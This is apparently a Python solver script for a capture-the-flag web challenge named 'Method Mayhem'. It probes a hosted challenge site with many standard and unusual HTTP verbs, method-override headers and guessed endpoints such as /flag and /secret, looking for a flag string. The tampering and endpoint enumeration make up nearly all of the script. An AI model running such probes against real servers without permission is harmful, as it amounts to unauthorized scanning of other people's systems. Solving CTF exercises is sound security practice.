#!/usr/bin/env python3
"""
Deep analysis of the Method Mayhem challenge
Focus on the checkStatus() function and response bodies
"""

import requests
import json
from bs4 import BeautifulSoup

BASE_URL = "https://ctfchallange-1.onrender.com"

def get_full_page():
    """Get and display the full HTML page"""
    print("[*] Fetching full page HTML")
    print("=" * 80)
    
    response = requests.get(BASE_URL)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Pretty print the HTML
    print(soup.prettify())
    
    return response.text

def test_click_endpoint_detailed():
    """Test /click endpoint with various methods and payloads"""
    print("\n[*] Detailed testing of /click endpoint")
    print("=" * 80)
    
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
    
    for method in methods:
        print(f"\n--- Testing {method} on /click ---")
        
        # Test with different content types
        headers_list = [
            {},
            {'Content-Type': 'application/json'},
            {'Content-Type': 'application/x-www-form-urlencoded'},
            {'X-HTTP-Method-Override': 'GET'},
        ]
        
        for headers in headers_list:
            try:
                response = requests.request(method, BASE_URL + '/click', headers=headers, timeout=10)
                
                if response.text and len(response.text) > 0:
                    print(f"  Headers: {headers}")
                    print(f"  Status: {response.status_code}")
                    print(f"  Response: {response.text}")
                    
                    if 'HW{' in response.text:
                        print(f"  🚩 FLAG FOUND!")
                        
                # Check response headers
                interesting = ['X-Flag', 'X-Secret', 'X-Method', 'Location', 'X-Hidden']
                for h in interesting:
                    if h in response.headers:
                        print(f"  Response Header {h}: {response.headers[h]}")
                        
            except Exception as e:
                pass

def test_status_endpoint():
    """Test /status endpoint"""
    print("\n[*] Testing /status endpoint")
    print("=" * 80)
    
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
    
    for method in methods:
        try:
            response = requests.request(method, BASE_URL + '/status', timeout=10)
            if response.status_code != 404:
                print(f"\n[{method}] Status: {response.status_code}")
                print(f"Response: {response.text[:500]}")
                
                if 'HW{' in response.text:
                    print(f"🚩 FLAG FOUND!")
                    
        except Exception as e:
            pass

def test_with_custom_methods():
    """Test with custom/unusual HTTP methods"""
    print("\n[*] Testing custom HTTP methods")
    print("=" * 80)
    
    custom_methods = ['PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK', 'DEBUG', 'FLAG']
    
    for method in custom_methods:
        try:
            # Use a raw request
            response = requests.request(method, BASE_URL + '/click', timeout=10)
            if response.status_code != 405 and response.status_code != 404:
                print(f"\n[{method}] Status: {response.status_code}")
                if response.text:
                    print(f"Response: {response.text[:500]}")
                    if 'HW{' in response.text:
                        print(f"🚩 FLAG FOUND!")
        except Exception as e:
            pass

def test_method_override():
    """Test HTTP method override techniques"""
    print("\n[*] Testing HTTP method override techniques")
    print("=" * 80)
    
    override_headers = [
        {'X-HTTP-Method-Override': 'FLAG'},
        {'X-HTTP-Method-Override': 'SECRET'},
        {'X-HTTP-Method-Override': 'ADMIN'},
        {'X-Method-Override': 'FLAG'},
        {'X-Method-Override': 'SECRET'},
        {'_method': 'FLAG'},
    ]
    
    for headers in override_headers:
        try:
            response = requests.post(BASE_URL + '/click', headers=headers, timeout=10)
            if response.text and len(response.text) > 0:
                print(f"\nHeaders: {headers}")
                print(f"Status: {response.status_code}")
                print(f"Response: {response.text[:500]}")
                
                if 'HW{' in response.text:
                    print(f"🚩 FLAG FOUND!")
        except Exception as e:
            pass

def test_all_endpoints_all_methods():
    """Comprehensive test of all possible endpoints"""
    print("\n[*] Comprehensive endpoint testing")
    print("=" * 80)
    
    endpoints = ['/', '/click', '/status', '/flag', '/secret', '/method', '/truth', '/check']
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
    
    for endpoint in endpoints:
        for method in methods:
            try:
                response = requests.request(method, BASE_URL + endpoint, timeout=5)
                if response.text and len(response.text) > 0 and response.status_code not in [404, 405]:
                    print(f"\n[{method} {endpoint}] Status: {response.status_code}")
                    print(f"Response: {response.text[:300]}")
                    
                    if 'HW{' in response.text:
                        print(f"🚩 FLAG FOUND at {method} {endpoint}!")
                        print(f"Full response: {response.text}")
            except:
                pass

def main():
    # Get full page HTML first
    html = get_full_page()
    
    # Test status endpoint (from checkStatus() function)
    test_status_endpoint()
    
    # Detailed click endpoint testing
    test_click_endpoint_detailed()
    
    # Test custom methods
    test_with_custom_methods()
    
    # Test method override
    test_method_override()
    
    # Comprehensive test
    test_all_endpoints_all_methods()

if __name__ == "__main__":
    main()
